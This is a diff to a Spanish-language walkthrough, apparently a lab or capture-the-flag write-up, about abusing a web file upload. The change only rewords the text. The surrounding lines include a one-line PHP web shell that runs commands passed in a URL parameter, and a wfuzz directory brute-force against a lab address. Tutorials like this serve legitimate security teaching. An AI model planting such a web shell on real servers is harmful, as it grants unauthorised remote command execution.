@@ -37,9 +37,9 @@ Al tener la oportunidad de subir archivos a una web, en lo primero que pensariam
 echo "<?php system(\$_GET['cmd']); ?>" >> test.php
 ```
 
-Despues de crear un el archivo lo subiremos al servidor. Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo.
+Despues de crear un el archivo lo subiremos al servidor.
 
-Para ello, haremos uso de wfuzz para encontrar esa ruta en donde ha sido guardado nuestro archivo.
+Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo. Para ello, haremos uso de wfuzz para encontrar esa ruta en donde ha sido guardado nuestro archivo.
 
 ```shell
 wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://172.17.0.2/FUZZ
